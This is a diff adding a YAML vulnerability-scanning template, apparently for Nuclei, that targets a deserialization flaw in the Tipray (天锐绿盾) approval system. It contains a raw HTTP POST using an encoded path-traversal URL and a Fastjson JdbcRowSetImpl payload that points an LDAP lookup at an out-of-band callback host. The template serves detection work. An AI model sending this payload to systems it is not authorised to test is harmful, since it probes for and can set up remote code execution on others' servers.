@@ -1,0 +1,40 @@
+id: poc-yaml-tipray-gsas-asign-deserialize
+info:
+  name: 天锐绿盾审批系统 asign 反序列化漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 反序列化, dnslog
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/service/.%2E/rest/ext/mail/add/asign HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+            "@type": "com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName": "ldap://{{reverse}}",
+            "autoCommit": true
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Internal server error"
+          - "set property error"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
